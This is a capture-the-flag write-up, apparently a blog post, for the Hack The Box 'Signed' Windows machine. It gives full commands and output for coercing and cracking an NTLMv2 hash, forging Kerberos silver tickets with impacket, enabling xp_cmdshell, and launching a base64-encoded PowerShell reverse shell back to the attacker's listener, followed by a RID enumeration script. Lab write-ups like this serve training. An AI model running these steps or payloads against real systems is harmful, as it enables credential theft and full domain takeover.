---
title: Signed [Medium]
date: 2025-10-07
tags: [htb, windows, ]
categories: [HTB Writeups]
author: 2Fa0n
img_path: /assets/img/signed-htb-season9
image: /assets/img/signed-htb-season9/signed-htb-season9_banner.png
---

# Signed HTB Season 9
## Machine information
As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: `scott` / `Sm230#C5NatH`. <br>
Author: [0xEr3bus](https://app.hackthebox.com/users/606891)

## Enumeration
### Nmap
```bash
└─$ sudo nmap -Pn -sC -sV 10.129.206.101
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 00:03 EDT
Nmap scan report for 10.129.206.101
Host is up (0.23s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.206.101:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-12T04:03:41
|_Not valid after:  2055-10-12T04:03:41
| ms-sql-info: 
|   10.129.206.101:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-12T04:05:56+00:00; 0s from scanner time.

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.52 seconds
```

Okay :D, this machine only open port `1433` so probably just exploited through this one service. <br>
This one is also the same with the previous machine [DarkZero](https://dudenation.github.io/posts/darkzero-htb-season9/) that also use `mssql` in order to get initial footage inside. <br>
&rarr; Let's add these up in `/etc/hosts`.

```bash
10.129.206.101     signed.htb DC01.signed.htb
```

### MSSQL (1433)
As we also got provided creds for authenticate to mssql service. So we not gonna use option `-windows-auth` cause this one is not domain user and these creds store in sql server.

```bash
└─$ mssqlclient.py scott:'Sm230#C5NatH'@10.129.206.101
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (scott  guest@master)>
```

Now we just doing some recons if we can enable `xp_cmdshell` to reverse shell.

```bash
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

So we can not due to permission so we gonna try NTLM Relay attack with `xp_dirtree`.

```bash
└─$ sudo responder -I tun0 -v
[sudo] password for kali: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.35]
    Responder IPv6             [dead:beef:4::1021]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-LGIYOBQ7H93]
    Responder Domain Name      [DBJO.LOCAL]
    Responder DCE-RPC Port     [46020]

[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...
```

```bash
SQL (scott  guest@msdb)> EXEC xp_dirtree '\\10.10.16.35\share';
subdirectory   depth   
------------   -----
```

```bash
[SMB] NTLMv2-SSP Client   : 10.129.206.101
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:43286bd5ee25e26e:D3439B32B33E7E1A8636F223DC39CF83:010100000000000080A6C461123BDC013CFA8D87814497CA0000000002000800440042004A004F0001001E00570049004E002D004C004700490059004F0042005100370048003900330004003400570049004E002D004C004700490059004F004200510037004800390033002E00440042004A004F002E004C004F00430041004C0003001400440042004A004F002E004C004F00430041004C0005001400440042004A004F002E004C004F00430041004C000700080080A6C461123BDC01060004000200000008003000300000000000000000000000003000006FC98112FF62BA9B41223A446B15F66292588605502E1C7AE0326C18D0D084110A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330035000000000000000000
```

Got the hash for `mssqlsvc` account. <br>
&rarr; Crack them out.

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt mssqlsvc_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)     
1g 0:00:00:14 DONE (2025-10-12 00:54) 0.06863g/s 307973p/s 307973c/s 307973C/s purcitititya..puppuh
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

We got `mssqlsvc:purPLE9795!@`. <br>
&rarr; As this one is the domain account so we need to include `-windows-auth` option cause this sql process is running under account service.

```bash
└─$ impacket-mssqlclient signed.htb/mssqlsvc:'purPLE9795!@'@10.129.206.101 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```

Let's check if we can now enable `xp_cmdshell`.

```bash
SQL (SIGNED\mssqlsvc  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

So we still can not enable yet. <br>
&rarr; Let's enum around more.

```bash
SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee    grantor                        
----------   --------   ---------------   ----------   --------   ----------------------------   
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser   

SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin   
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------   
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0   

##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0   

SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0   

NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   

NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0   

NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0   

scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0   

SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0   

SQL (SIGNED\mssqlsvc  guest@master)> enum_users
UserName                            RoleName   LoginName                           DefDBName   DefSchemaName       UserID                                                                   SID   
---------------------------------   --------   ---------------------------------   ---------   -------------   ----------   -------------------------------------------------------------------   
##MS_AgentSigningCertificate##      public     ##MS_AgentSigningCertificate##      master      NULL            b'6         '   b'010600000000000901000000fb1b6ce60eda55e1d3dde93b99db322bfc435563'   

##MS_PolicyEventProcessingLogin##   public     ##MS_PolicyEventProcessingLogin##   master      dbo             b'5         '                                   b'56f12609fb4eb548906b5a62effb1840'   

dbo                                 db_owner   sa                                  master      dbo             b'1         '                                                                 b'01'   

guest                               public     NULL                                NULL        guest           b'2         '                                                                 b'00'   

INFORMATION_SCHEMA                  public     NULL                                NULL        NULL            b'3         '                                                                  NULL   

sys                                 public     NULL                                NULL        NULL            b'4         '                                                                  NULL
```

Here is some information we got and take a look at [hacktricks](https://book.hacktricks.wiki/en/index.html#hacktricks). We found out this one [silver-ticket](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/silver-ticket.html#silver-ticket) which we gonna use it to exploit cause this method said that *acquiring the NTLM hash of a service account* and we got the `NTLM hash` of `mssqlsvc`. <br>
&rarr; We can forge **Ticket Granting Service (TGS)** that can **impersonating any user**.

### Silver Ticket
So in order to forge, we need to have the ntlm hash of `mssqlsvc` and also domain SID and RID as well. <br>
From what we recon earlier, we see that `IT` has `sysadmin` so we gonna take the SID and RID of this groups and also our `mssqlsvc` too.

```bash
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT SUSER_SID('SIGNED\IT');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```

```bash
SQL (SIGNED\mssqlsvc  guest@msdb)> SELECT SUSER_SID('SIGNED\mssqlsvc');
                                                              
-----------------------------------------------------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

Now we got two binary SID, we need to convert them to readable format. <br>
&rarr; We can do it with python or using the bash script from [mssql](https://0xdf.gitlab.io/2025/07/17/htb-redelegate.html#mssql) by [0xdf](https://0xdf.gitlab.io/).

```bash
└─$ python3 -c "
import struct
sid = bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000')
print('S-{}-{}'.format(sid[0], int.from_bytes(sid[2:8], 'big')) + ''.join(['-' + str(struct.unpack('<I', sid[8+i*4:12+i*4])[0]) for i in range(sid[1])]))
"
S-1-5-21-4088429403-1159899800-2753317549-1105
```

This one is for `SIGNED\IT`.

```bash
└─$ python3 -c "                                    
import struct
sid = bytes.fromhex('0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000')
print('S-{}-{}'.format(sid[0], int.from_bytes(sid[2:8], 'big')) + ''.join(['-' + str(struct.unpack('<I', sid[8+i*4:12+i*4])[0]) for i in range(sid[1])]))
"
S-1-5-21-4088429403-1159899800-2753317549-1103
```

And this is for `mssqlsvc`.

Next up, let's calculate the NTLM hash as we got the creds of `mssqlsvc`.

```bash
└─$ python3 -c "import hashlib; print(hashlib.new('md4', 'purPLE9795\!@'.encode('utf-16le')).hexdigest())"
ef699384c3285c54128a3ee1ddb1a0cc
```

Now head to forge the silver ticket.

```bash
└─$ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB:1433 -groups 1105 -user-id 1103 mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

Let's set the ticket.

```bash
└─$ export KRB5CCNAME=mssqlsvc.ccache
```

Now we can auth again and as expected, we will got the higher role in the sql.

```bash
└─$ impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB                                                                                                                                                          
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Let's check out if we can now enable `xp_cmdshell`.

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```

BOOM! We have successfully enable `xp_cmdshell`. <br>
As there is alot of way that we found in [mssql-for-pentester-command-execution-with-xp_cmdshell](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/). <br>
&rarr; We can just use this website that got lots of combination [revshells](https://www.revshells.com/).

So we gonna use the powershell base64 to reverse shell for this one.

![Revshells](/assets/img/signed-htb-season9/signed-htb-season9_revshells.png)

Setup our listener.

```bash
└─$ rlwrap -cAr nc -lvnp 4445
listening on [any] 4445 ...
```

Now execute it.

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA1ACIALAA0ADQANAA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

```bash
└─$ rlwrap -cAr nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.10.16.35] from (UNKNOWN) [10.129.206.101] 57524
PS C:\Windows\system32> whoami
signed\mssqlsvc
```

Got a reverse shell as `mssqlsvc`.

```bash
PS C:\Users\mssqlsvc\Desktop> dir


    Directory: C:\Users\mssqlsvc\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---       10/11/2025   9:02 PM             34 user.txt                                                              


PS C:\Users\mssqlsvc\Desktop> type user.txt
82e752710b2cbffc389f023903c3352b
```

Nailed the `user.txt` flag.

## Initial Access
After we got into `mssqlsvc`. <br>
&rarr; Doing some recon of domain and groups that we can able to forge for highest role which is `administrator`.

### Discovery
```bash
PS C:\Users\mssqlsvc\Desktop> net user /domain

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            amelia.kelly             ava.morris               
charlotte.price          elijah.brooks            emma.clark               
Guest                    harper.diaz              henry.bennett            
isabella.evans           jackson.gray             james.morgan             
krbtgt                   liam.wright              lucas.murphy             
mia.cooper               mssqlsvc                 noah.adams               
oliver.mills             sophia.turner            william.johnson          
The command completed successfully.

PS C:\Users\mssqlsvc\Desktop> net user Administrator /domain
User name                    Administrator
Full Name                    
Comment                      Built-in account for administering the computer/domain
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/2/2025 10:12:32 AM
Password expires             Never
Password changeable          10/3/2025 10:12:32 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   10/11/2025 9:02:23 PM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *Domain Admins        *Group Policy Creator 
                             *Enterprise Admins    *Schema Admins        
                             *Domain Users         
The command completed successfully.

PS C:\Users\mssqlsvc\Desktop> wmic useraccount get name,sid
Name             SID                                             

Administrator    S-1-5-21-4088429403-1159899800-2753317549-500   

Guest            S-1-5-21-4088429403-1159899800-2753317549-501   

krbtgt           S-1-5-21-4088429403-1159899800-2753317549-502   

mssqlsvc         S-1-5-21-4088429403-1159899800-2753317549-1103  

oliver.mills     S-1-5-21-4088429403-1159899800-2753317549-1109  

emma.clark       S-1-5-21-4088429403-1159899800-2753317549-1110  

liam.wright      S-1-5-21-4088429403-1159899800-2753317549-1111  

noah.adams       S-1-5-21-4088429403-1159899800-2753317549-1112  

ava.morris       S-1-5-21-4088429403-1159899800-2753317549-1113  

sophia.turner    S-1-5-21-4088429403-1159899800-2753317549-1114  

james.morgan     S-1-5-21-4088429403-1159899800-2753317549-1115  

mia.cooper       S-1-5-21-4088429403-1159899800-2753317549-1116  

elijah.brooks    S-1-5-21-4088429403-1159899800-2753317549-1117  

isabella.evans   S-1-5-21-4088429403-1159899800-2753317549-1118  

lucas.murphy     S-1-5-21-4088429403-1159899800-2753317549-1119  

william.johnson  S-1-5-21-4088429403-1159899800-2753317549-1120  

charlotte.price  S-1-5-21-4088429403-1159899800-2753317549-1121  

henry.bennett    S-1-5-21-4088429403-1159899800-2753317549-1122  

amelia.kelly     S-1-5-21-4088429403-1159899800-2753317549-1123  

jackson.gray     S-1-5-21-4088429403-1159899800-2753317549-1124  

harper.diaz      S-1-5-21-4088429403-1159899800-2753317549-1125  



PS C:\Users\mssqlsvc\Desktop> wmic group get name,sid
Name                                     SID                                             

Server Operators                         S-1-5-32-549                                    

Account Operators                        S-1-5-32-548                                    

Pre-Windows 2000 Compatible Access       S-1-5-32-554                                    

Incoming Forest Trust Builders           S-1-5-32-557                                    

Windows Authorization Access Group       S-1-5-32-560                                    

Terminal Server License Servers          S-1-5-32-561                                    

Administrators                           S-1-5-32-544                                    

Users                                    S-1-5-32-545                                    

Guests                                   S-1-5-32-546                                    

Print Operators                          S-1-5-32-550                                    

Backup Operators                         S-1-5-32-551                                    

Replicator                               S-1-5-32-552                                    

Remote Desktop Users                     S-1-5-32-555                                    

Network Configuration Operators          S-1-5-32-556                                    

Performance Monitor Users                S-1-5-32-558                                    

Performance Log Users                    S-1-5-32-559                                    

Distributed COM Users                    S-1-5-32-562                                    

IIS_IUSRS                                S-1-5-32-568                                    

Cryptographic Operators                  S-1-5-32-569                                    

Event Log Readers                        S-1-5-32-573                                    

Certificate Service DCOM Access          S-1-5-32-574                                    

RDS Remote Access Servers                S-1-5-32-575                                    

RDS Endpoint Servers                     S-1-5-32-576                                    

RDS Management Servers                   S-1-5-32-577                                    

Hyper-V Administrators                   S-1-5-32-578                                    

Access Control Assistance Operators      S-1-5-32-579                                    

Remote Management Users                  S-1-5-32-580                                    

Storage Replica Administrators           S-1-5-32-582                                    

Cert Publishers                          S-1-5-21-4088429403-1159899800-2753317549-517   

RAS and IAS Servers                      S-1-5-21-4088429403-1159899800-2753317549-553   

Allowed RODC Password Replication Group  S-1-5-21-4088429403-1159899800-2753317549-571   

Denied RODC Password Replication Group   S-1-5-21-4088429403-1159899800-2753317549-572   

DnsAdmins                                S-1-5-21-4088429403-1159899800-2753317549-1101  

SQLServer2005SQLBrowserUser$DC01         S-1-5-21-4088429403-1159899800-2753317549-1126  

Cert Publishers                          S-1-5-21-4088429403-1159899800-2753317549-517   

RAS and IAS Servers                      S-1-5-21-4088429403-1159899800-2753317549-553   

Allowed RODC Password Replication Group  S-1-5-21-4088429403-1159899800-2753317549-571   

Denied RODC Password Replication Group   S-1-5-21-4088429403-1159899800-2753317549-572   

DnsAdmins                                S-1-5-21-4088429403-1159899800-2753317549-1101  

SQLServer2005SQLBrowserUser$DC01         S-1-5-21-4088429403-1159899800-2753317549-1126  

Cloneable Domain Controllers             S-1-5-21-4088429403-1159899800-2753317549-522   

Developers                               S-1-5-21-4088429403-1159899800-2753317549-1107  

DnsUpdateProxy                           S-1-5-21-4088429403-1159899800-2753317549-1102  

Domain Admins                            S-1-5-21-4088429403-1159899800-2753317549-512   

Domain Computers                         S-1-5-21-4088429403-1159899800-2753317549-515   

Domain Controllers                       S-1-5-21-4088429403-1159899800-2753317549-516   

Domain Guests                            S-1-5-21-4088429403-1159899800-2753317549-514   

Domain Users                             S-1-5-21-4088429403-1159899800-2753317549-513   

Enterprise Admins                        S-1-5-21-4088429403-1159899800-2753317549-519   

Enterprise Key Admins                    S-1-5-21-4088429403-1159899800-2753317549-527   

Enterprise Read-only Domain Controllers  S-1-5-21-4088429403-1159899800-2753317549-498   

Finance                                  S-1-5-21-4088429403-1159899800-2753317549-1106  

Group Policy Creator Owners              S-1-5-21-4088429403-1159899800-2753317549-520   

HR                                       S-1-5-21-4088429403-1159899800-2753317549-1104  

IT                                       S-1-5-21-4088429403-1159899800-2753317549-1105  

Key Admins                               S-1-5-21-4088429403-1159899800-2753317549-526   

Protected Users                          S-1-5-21-4088429403-1159899800-2753317549-525   

Read-only Domain Controllers             S-1-5-21-4088429403-1159899800-2753317549-521   

Schema Admins                            S-1-5-21-4088429403-1159899800-2753317549-518   

Support                                  S-1-5-21-4088429403-1159899800-2753317549-1108
```

Found out administrator are in `Domain Admins`, `Enterprise Admins` and we so got the RID of these two. <br>
We can also craft a python script to bruteforce the RID.

```py
#!/usr/bin/env python3
import pymssql, struct

HOST, USER, PASS = "dc01.signed.htb", "SIGNED\\mssqlsvc", "purPLE9795!@"
SID = "0105000000000005150000005b7bb0f398aa2245ad4a1ca4"

conn = pymssql.connect(HOST, USER, PASS, 'master')
cur = conn.cursor()

for rid in range(500, 1500):
    sid_hex = SID + struct.pack('<I', rid).hex()
    cur.execute(f"SELECT SUSER_SNAME(0x{sid_hex})")
    name = cur.fetchone()
    if name and name[0]:
        print(f"[+] {rid:<6} {name[0]}")

conn.close()
```

```bash
└─$ python3 rid_brute.py                                                                                 
[+] 500    SIGNED\Administrator
[+] 501    SIGNED\Guest
[+] 502    SIGNED\krbtgt
[+] 512    SIGNED\Domain Admins
[+] 513    SIGNED\Domain Users
[+] 514    SIGNED\Domain Guests
[+] 515    SIGNED\Domain Computers
[+] 516    SIGNED\Domain Controllers
[+] 517    SIGNED\Cert Publishers
[+] 518    SIGNED\Schema Admins
[+] 519    SIGNED\Enterprise Admins
[+] 520    SIGNED\Group Policy Creator Owners
[+] 521    SIGNED\Read-only Domain Controllers
[+] 522    SIGNED\Cloneable Domain Controllers
[+] 525    SIGNED\Protected Users
[+] 526    SIGNED\Key Admins
[+] 527    SIGNED\Enterprise Key Admins
[+] 553    SIGNED\RAS and IAS Servers
[+] 571    SIGNED\Allowed RODC Password Replication Group
[+] 572    SIGNED\Denied RODC Password Replication Group
[+] 1000   SIGNED\DC01$
[+] 1101   SIGNED\DnsAdmins
[+] 1102   SIGNED\DnsUpdateProxy
[+] 1103   SIGNED\mssqlsvc
[+] 1104   SIGNED\HR
[+] 1105   SIGNED\IT
[+] 1106   SIGNED\Finance
[+] 1107   SIGNED\Developers
[+] 1108   SIGNED\Support
[+] 1109   SIGNED\oliver.mills
[+] 1110   SIGNED\emma.clark
[+] 1111   SIGNED\liam.wright
[+] 1112   SIGNED\noah.adams
[+] 1113   SIGNED\ava.morris
[+] 1114   SIGNED\sophia.turner
[+] 1115   SIGNED\james.morgan
[+] 1116   SIGNED\mia.cooper
[+] 1117   SIGNED\elijah.brooks
[+] 1118   SIGNED\isabella.evans
[+] 1119   SIGNED\lucas.murphy
[+] 1120   SIGNED\william.johnson
[+] 1121   SIGNED\charlotte.price
[+] 1122   SIGNED\henry.bennett
[+] 1123   SIGNED\amelia.kelly
[+] 1124   SIGNED\jackson.gray
[+] 1125   SIGNED\harper.diaz
[+] 1126   SIGNED\SQLServer2005SQLBrowserUser$DC01
```

Now let's forge again.

## Privilege Escalation
We will forge `Domain Admins` and `Enterprise Admins` to `mssqlsvc`.

### Silver Ticket (SYSTEM)
```bash
└─$ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB:1433 -groups 512,519,1105 -user-id 1103 mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

Set the ticket again and authen again.

```bash
└─$ impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB                                                                                                                                                                  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Now we can a look at this one [1433---pentesting-mssql---microsoft-sql-server](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html?highlight=mssql#1433---pentesting-mssql---microsoft-sql-server) and found out we can also read and write files with `OPENROWSET`. <br>
&rarr; To ensure that we got the `BULK` option, we need to require `ADMINISTER BULK OPERATIONS` or `ADMINISTER DATABASE BULK OPERATIONS` permission.

```bash
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
entity_name   subentity_name   permission_name              
